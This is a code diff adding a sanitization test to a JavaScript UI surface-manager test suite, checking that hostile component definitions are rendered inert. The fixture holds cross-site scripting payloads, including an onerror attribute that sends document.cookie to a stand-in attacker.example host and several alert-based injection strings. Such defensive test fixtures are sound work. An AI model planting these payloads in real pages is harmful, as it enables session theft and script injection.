@@ -364,6 +364,49 @@ function runSurfaceManagerMaterializationSuite(options = {}) {
     context.assert(managerElement && managerElement.registered[0].contentRef === 'inspector.content', 'Registered records keep component refs as content refs');
     context.assert(managerElement && managerElement.registered.some((record) => record.type === 'region' && record.kind === 'card'), 'Registered records preserve RMT kind');
 
+    const hostileDocument = createFakeDocument();
+    const hostileRoot = hostileDocument.createElement('main');
+    hostileDocument.body.appendChild(hostileRoot);
+    adapter.materializeSurfaces({
+      surfaces: [{
+        id: 'surface.hostile',
+        type: 'window',
+        manager: 'workbench.manager',
+        component: 'hostile.content'
+      }],
+      components: [{
+        id: 'hostile.content',
+        tag: 'script',
+        attributes: {
+          onerror: 'fetch("https://attacker.example/?c="+document.cookie)',
+          href: 'javascript:alert(1)',
+          style: 'background-image:url(javascript:alert(2))',
+          srcdoc: '<script>alert(3)</script>',
+          title: 'Safe title'
+        },
+        props: {
+          innerHTML: '<img src=x onerror=alert(4)>',
+          outerHTML: '<svg onload=alert(5)>',
+          onclick: 'alert(6)',
+          textContent: 'safe text'
+        }
+      }]
+    }, {
+      root: hostileRoot,
+      domDocument: hostileDocument
+    });
+    const hostileManager = hostileRoot.querySelector('x-surface-manager');
+    const hostileSurface = hostileManager && findSurface(hostileManager, 'surface.hostile');
+    const hostileContent = hostileSurface && hostileSurface.children[0];
+    context.assert(hostileContent && hostileContent.localName === 'div', 'Unsafe component tags fall back to inert div elements');
+    context.assert(hostileContent && hostileContent.getAttribute('onerror') === null, 'Surface materialization drops event handler attributes');
+    context.assert(hostileContent && hostileContent.getAttribute('href') === null, 'Surface materialization drops javascript: URL attributes');
+    context.assert(hostileContent && hostileContent.getAttribute('style') === null, 'Surface materialization drops inline style attributes');
+    context.assert(hostileContent && hostileContent.getAttribute('srcdoc') === null, 'Surface materialization drops srcdoc attributes');
+    context.assert(hostileContent && hostileContent.innerHTML === undefined, 'Surface materialization does not assign innerHTML props');
+    context.assert(hostileContent && hostileContent.onclick === undefined, 'Surface materialization does not assign event handler props');
+    context.assert(hostileContent && hostileContent.textContent === 'safe text', 'Surface materialization preserves safe scalar props');
+
     const existingDocument = createFakeDocument();
     const existingManager = existingDocument.createElement('x-surface-manager');
     const existingInspector = existingDocument.createElement('x-surface-window');
